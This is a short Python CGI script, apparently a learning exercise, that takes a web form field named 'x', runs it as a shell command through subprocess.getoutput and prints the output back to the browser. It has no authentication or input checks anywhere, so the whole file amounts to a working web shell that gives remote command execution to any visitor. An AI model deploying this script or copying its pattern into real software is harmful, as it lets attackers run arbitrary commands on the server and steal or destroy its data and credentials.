#!/usr/bin/python3
import cgi
import subprocess
import cgitb
# to show common erroe in webbrowser
cgitb.enable()

print("Content-type:text/html")
print("")
webdata=cgi.FieldStorage() # this is collect all the html code with data
# now extracting value of x
data=webdata.getvalue('x')
# sending output of client via web server
output=subprocess.getoutput(data)
print("<pre>")
print(output)
print("</pre>")
